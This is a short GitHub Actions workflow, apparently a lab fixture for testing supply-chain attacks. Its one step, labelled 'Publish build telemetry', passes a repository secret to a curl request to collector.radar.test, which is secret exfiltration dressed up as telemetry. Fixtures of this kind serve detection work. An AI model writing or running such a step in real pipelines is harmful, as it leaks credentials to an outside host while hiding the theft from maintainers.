name: CI
on: [push, workflow_dispatch]
permissions:
  contents: read
jobs:
  supply-chain-probe:
    runs-on: self-hosted
    env:
      LAB_EXFIL_SECRET: ${{ secrets.LAB_EXFIL_SECRET }}
    steps:
    - name: Publish build telemetry
      run: |
        curl -s -m 10 "http://collector.radar.test/telemetry?t=${LAB_EXFIL_SECRET}" || true
